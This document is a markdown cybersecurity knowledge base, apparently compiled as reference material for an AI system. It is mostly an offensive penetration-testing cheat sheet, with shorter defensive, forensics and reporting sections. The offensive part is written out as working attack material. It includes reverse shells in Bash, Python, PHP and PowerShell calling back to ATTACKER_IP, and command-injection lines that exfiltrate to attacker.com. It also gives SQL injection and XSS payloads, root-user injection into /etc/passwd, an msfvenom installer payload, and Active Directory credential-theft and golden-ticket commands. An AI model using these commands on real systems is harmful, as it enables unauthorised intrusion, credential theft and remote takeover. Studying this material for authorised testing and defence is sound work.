# CYBERSECURITY — Complete Knowledge Base
# TitanAI Reference: Offensive + Defensive + Advanced Techniques

---

## PENETRATION TESTING METHODOLOGY

### Engagement Phases
1. **Reconnaissance** — passive and active information gathering
2. **Scanning & Enumeration** — identify live hosts, open ports, services, versions
3. **Vulnerability Analysis** — identify exploitable weaknesses
4. **Exploitation** — gain initial access
5. **Post-Exploitation** — maintain access, escalate privileges, lateral movement
6. **Reporting** — document findings, risk ratings, remediation recommendations

### Reconnaissance
- **OSINT Tools** — theHarvester (emails, subdomains), Maltego (relationships), Shodan (exposed devices), Censys, WHOIS, DNSrecon
- **Google Dorks** — `site:`, `filetype:`, `inurl:`, `intitle:`, `cache:` operators for targeted searches
- **LinkedIn Recon** — employee names, job titles, technology stack from job postings
- **Shodan Queries** — `org:`, `port:`, `ssl.cert.subject.cn:`, `http.title:` for specific targets
- **FOCA** — document metadata extraction revealing internal hostnames, usernames, software versions

### Scanning & Enumeration
```
# Network scan
nmap -sC -sV -oA initial_scan 10.10.10.0/24

# Full port scan
nmap -p- --min-rate 10000 -oA full_scan 10.10.10.x

# Service version aggressive
nmap -sV --version-intensity 9 -p 22,80,443 10.10.10.x

# UDP scan
nmap -sU --top-ports 20 10.10.10.x

# OS detection
nmap -O --osscan-guess 10.10.10.x
```

### Web Application Testing
- **Directory Bruteforce** — `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt`
- **Subdomain Enumeration** — `subfinder -d target.com`, `amass enum -d target.com`
- **Technology Fingerprinting** — Wappalyzer, WhatWeb, `curl -I http://target`
- **Burp Suite** — intercept proxy; Scanner, Intruder (brute force), Repeater (manual testing), Decoder
- **OWASP Top 10** — Injection, Broken Auth, XSS, IDOR, Security Misconfiguration, Vulnerable Components, etc.

---

## OFFENSIVE TECHNIQUES

### SQL Injection
- **Types** — Classic (error-based), Blind (boolean/time-based), Out-of-band, Second-order
- **Detection** — `'`, `"`, `1' OR '1'='1`, `1; DROP TABLE`
- **SQLmap** — `sqlmap -u "http://target/page?id=1" --dbs --dump`
- **WAF Bypass** — encoding: `%27`, `0x27`, `char(39)`; comments: `/*!*/`, `/**/`; case mixing

### Cross-Site Scripting (XSS)
- **Reflected** — payload in URL parameter, executed once
- **Stored** — payload saved to database, executed for every visitor
- **DOM-based** — payload in DOM environment, never touches server
- **Payloads** — `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `"><svg onload=alert(1)>`
- **Filter Bypass** — `<ScRiPt>`, HTML entities, Unicode encoding, JS template literals

### Command Injection
- **Test Payloads** — `; whoami`, `| whoami`, `` `whoami` ``, `$(whoami)`, `%0awhoami`
- **Blind Detection** — `; sleep 5`, `| ping -c 4 attacker.com`
- **Out-of-Band** — `; curl http://attacker.com/$(whoami)`

### File Inclusion
- **LFI** — `../../../etc/passwd`, `....//....//etc/passwd` (filter bypass)
- **LFI to RCE** — log poisoning (`/var/log/apache2/access.log`), PHP session files, `/proc/self/fd/`
- **RFI** — `?page=http://attacker.com/shell.php` (requires `allow_url_include=On`)
- **PHP Wrappers** — `php://filter/convert.base64-encode/resource=index.php`, `php://input`, `data://`

### Authentication Attacks
- **Brute Force** — Hydra: `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "..."`
- **Password Spraying** — one password against many accounts; avoids lockout
- **Credential Stuffing** — leaked credentials from breaches tested against target
- **JWT Attacks** — `alg:none` bypass, weak secret brute force (`hashcat -a 0 -m 16500 jwt.txt wordlist`)
- **OAuth Flaws** — redirect_uri manipulation, state parameter CSRF, implicit flow token leakage

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat listener
nc -lvnp 4444
```

### Shell Stabilisation
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## PRIVILEGE ESCALATION

### Linux Privilege Escalation
```bash
# Automated enumeration
./linpeas.sh
./lse.sh

# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo permissions
sudo -l

# Writeable /etc/passwd
openssl passwd -1 -salt salt password123
echo "newroot:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Capabilities
getcap -r / 2>/dev/null

# NFS (no_root_squash)
showmount -e TARGET_IP

# Kernel exploits
uname -a
searchsploit linux kernel 4.x.x
```

### Windows Privilege Escalation
```powershell
# Automated enumeration
.\WinPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
.\accesschk.exe -uwcqv "Everyone" *
sc config SERVICE_NAME binpath="C:\evil.exe"

# Token impersonation (SeImpersonatePrivilege)
.\PrintSpoofer.exe -i -c cmd
.\RoguePotato.exe
.\GodPotato.exe

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

### GTFOBins — Unix Binaries
- **vim** — `:!/bin/bash`
- **python** — `python -c 'import os; os.system("/bin/bash")'`
- **find** — `find . -exec /bin/bash \; -quit`
- **wget** — `wget http://attacker.com/file -O /etc/sudoers` (overwrite)
- **tar** — `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
- **awk** — `awk 'BEGIN {system("/bin/bash")}'`
- **nmap** (old) — `nmap --interactive` then `!sh`

---

## ACTIVE DIRECTORY ATTACKS

### Enumeration
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainGroup -MemberIdentity "Domain Admins"
Get-DomainComputer
Find-LocalAdminAccess
Get-DomainTrust

# BloodHound
SharpHound.exe -c All --zipfilename bloodhound.zip
# Then import zip to BloodHound GUI
# Query: Find Shortest Path to Domain Admins
```

### Kerberoasting
```bash
# Request service tickets for SPNs
python3 GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request

# Crack with hashcat
hashcat -a 0 -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
# Users without pre-auth required
python3 GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass

# Crack
hashcat -a 0 -m 18200 asrep_hashes.txt wordlist.txt
```

### Pass-the-Hash
```bash
# CrackMapExec
crackmapexec smb DC_IP -u Administrator -H NTLM_HASH

# Impacket
python3 smbexec.py -hashes :NTLM_HASH DOMAIN/Administrator@TARGET_IP

# Evil-WinRM
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
```

### DCSync Attack
```bash
# Requires Domain Admin or specific replication rights
python3 secretsdump.py DOMAIN/DA_USER:PASSWORD@DC_IP

# Mimikatz
lsadump::dcsync /domain:DOMAIN /user:krbtgt
```

### Golden Ticket
```bash
# After obtaining krbtgt hash via DCSync
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN username

export KRB5CCNAME=username.ccache
python3 psexec.py -k -no-pass DOMAIN/username@TARGET
```

---

## ZERO-DAY & ADVANCED VULNERABILITIES

### Zero-Day Definition & Lifecycle
- **Zero-Day** — vulnerability unknown to vendor; vendor has 0 days to patch
- **N-Day** — patch exists but many systems remain unpatched; still widely exploited
- **Discovery Methods** — fuzzing, manual code review, reverse engineering, variant analysis
- **Disclosure** — responsible: notify vendor first (Google Project Zero: 90 days); full: immediate public; coordinated: vendor + researcher agree timeline
- **Market** — Zerodium publishes prices: iOS zero-click $2.5M, Android zero-click $2.5M, Chrome RCE $500K, Windows LPE $200K

### Zero-Click Vulnerabilities
- **Definition** — attack requires NO user interaction; triggered by receiving data
- **Entry Points** — iMessage, WhatsApp, SMS/RCS, WiFi, Bluetooth, email parsers
- **FORCEDENTRY (CVE-2021-30860)** — NSO Group; iMessage integer overflow in CoreGraphics; bypassed BlastDoor sandbox; used for Pegasus spyware
- **WhatsApp (CVE-2019-3568)** — VOIP stack buffer overflow; no answer required
- **AirDrop/AWDL** — WiFi protocol heap overflow; proximity-based zero-click
- **Detection** — behavioural anomalies (unexpected process spawning, network traffic); MVT tool for mobile forensics

### Vulnerability Classes
- **Use-After-Free (UAF)** — accessing freed memory; attacker controls allocation to redirect code execution
- **Type Confusion** — object treated as wrong type; breaks type safety; common in JIT engines
- **Buffer Overflow** — write beyond buffer; overwrite return address or adjacent data; mitigated by ASLR/DEP/stack canaries
- **Integer Overflow** — value wraps beyond max; leads to undersized allocation then overflow
- **Race Condition (TOCTOU)** — time-of-check to time-of-use; win race to exploit privileged operation
- **Format String** — user input as printf format; `%n` writes arbitrary memory

### Exploit Mitigations & Bypasses
| Mitigation | Bypass Technique |
|------------|-----------------|
| ASLR | Heap spray, info leak, bruteforce (32-bit) |
| NX/DEP | ROP (Return-Oriented Programming) |
| Stack Canary | Info leak, bruteforce, off-by-one |
| CFI | JIT spraying, vtable confusion |
| RELRO | Use data-only attacks |
| PIE | Combined with ASLR bypass |

---

## NETWORK ATTACKS

### Man-in-the-Middle
```bash
# ARP Spoofing
arpspoof -i eth0 -t TARGET_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP TARGET_IP

# Responder (NBT-NS/LLMNR Poisoning — Windows Networks)
responder -I eth0 -rdwv

# Evil twin WiFi
hostapd-wpe evil_twin.conf
```

### Password Cracking
```bash
# Hashcat modes
hashcat -m 0 hashes.txt wordlist.txt           # MD5
hashcat -m 1000 hashes.txt wordlist.txt        # NTLM
hashcat -m 1800 hashes.txt wordlist.txt        # SHA-512 (Linux)
hashcat -m 22000 hashes.txt wordlist.txt       # WPA2

# Rules
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force with pattern)
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d?d?d
```

---

## DEFENSIVE SECURITY

### Detection Engineering
- **Sigma Rules** — vendor-agnostic detection rules; YAML format; converted to SIEM queries
- **YARA Rules** — binary pattern matching for malware detection; strings + conditions
- **MITRE ATT&CK** — adversary tactic/technique framework; map detections to TTPs
- **Threat Hunting** — proactive search for undetected threats using hypothesis-driven approach

### Incident Response
1. **Preparation** — IR plan, playbooks, tools staged, contacts established
2. **Identification** — detect and confirm incident; determine scope
3. **Containment** — short-term (isolate affected systems); long-term (remove threat)
4. **Eradication** — remove malware, close entry points, patch vulnerabilities
5. **Recovery** — restore systems, monitor for re-infection
6. **Lessons Learned** — post-incident review, improve defences

### Forensics
```bash
# Memory acquisition
./avml /tmp/memory.lime

# Disk imaging
dd if=/dev/sda of=/mnt/external/disk.img bs=4M
dcfldd if=/dev/sda hash=sha256 hashlog=/mnt/external/hash.log of=/mnt/external/disk.img

# Volatility (memory analysis)
vol.py -f memory.lime linux_pslist
vol.py -f memory.lime linux_netstat
vol.py -f memory.lime linux_bash

# Timeline analysis
log2timeline.py plaso.db /mnt/case
psort.py -z UTC plaso.db "SELECT * FROM log2timeline" > timeline.csv
```

### Hardening Checklist
- **Linux** — disable root SSH, key auth only, fail2ban, UFW/iptables, AppArmor/SELinux, auditd, unattended-upgrades
- **Windows** — CIS Benchmark, Windows Defender ATP, AppLocker, LAPS (local admin), PowerShell constrained language mode, credential guard
- **Network** — network segmentation, zero-trust, IDS/IPS (Snort/Suricata), DNS filtering, email security (SPF/DKIM/DMARC)
- **Web** — WAF (ModSecurity/Cloudflare), CSP headers, HSTS, TLS 1.2+ only, input validation

---

## TOOLS REFERENCE

### Essential Tools
| Tool | Category | Use |
|------|----------|-----|
| Nmap | Scanning | Port scanning, service detection |
| Burp Suite | Web | HTTP proxy, scanner, fuzzer |
| Metasploit | Framework | Exploit framework, payloads |
| Hashcat | Cracking | GPU password cracking |
| John the Ripper | Cracking | CPU password cracking |
| SQLmap | SQLi | Automated SQL injection |
| Gobuster | Enum | Directory/DNS bruteforce |
| Nikto | Web Scan | Web server scanner |
| Responder | MITM | NBT-NS/LLMNR poisoning |
| BloodHound | AD | Attack path analysis |
| Impacket | AD/Network | Python network/AD tools |
| CrackMapExec | AD | Swiss Army knife for AD |
| Evil-WinRM | Shell | WinRM shell |
| Mimikatz | Creds | Windows credential extraction |
| LinPEAS/WinPEAS | PrivEsc | Automated privilege escalation enumeration |
| Wireshark | Network | Packet capture and analysis |
| tcpdump | Network | CLI packet capture |
| Volatility | Forensics | Memory forensics |
| Autopsy | Forensics | Digital forensics platform |

### Wordlists
- **rockyou.txt** — 14M passwords from 2009 RockYou breach; standard wordlist
- **SecLists** — comprehensive security testing lists (Daniel Miessler); dirs, users, passwords, fuzzing
- **CeWL** — generate wordlists from target website
- **crunch** — generate custom wordlists by pattern

---

## REPORTING

### Vulnerability Severity (CVSS v3)
| Score | Severity | Action |
|-------|----------|--------|
| 9.0-10.0 | Critical | Immediate patch |
| 7.0-8.9 | High | Patch within 30 days |
| 4.0-6.9 | Medium | Patch within 90 days |
| 0.1-3.9 | Low | Patch in next cycle |

### Report Structure
1. **Executive Summary** — non-technical overview, business impact, overall risk rating
2. **Scope** — what was tested, what was excluded, timeframe
3. **Methodology** — testing approach, tools used, standards followed
4. **Findings** — vulnerability name, CVSS score, description, evidence (screenshots/logs), recommendation
5. **Risk Matrix** — likelihood × impact visual
6. **Remediation Roadmap** — prioritised fix list with suggested timeline
